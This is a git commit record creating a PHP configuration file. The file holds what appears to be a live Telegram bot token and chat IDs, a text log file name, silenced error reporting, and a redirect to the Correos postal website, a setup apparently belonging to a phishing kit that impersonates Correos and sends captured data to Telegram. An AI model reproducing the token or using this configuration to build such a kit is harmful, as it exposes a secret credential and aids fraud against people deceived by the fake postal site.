7bade473a0887accf829387a73bad689096af289
jalaloooox <hmyouness59@gmail.com>
2022-10-30 03:37:36 +0100

    create project

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5777781269:AAGvzaB6hHMqgQl1b24B855Zc-UNT6BTX-k");
+define("TELEGRAM_CHAT_ID", "680230374");
+define("TELEGRAM_CHAT_IDD", "-680230374");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
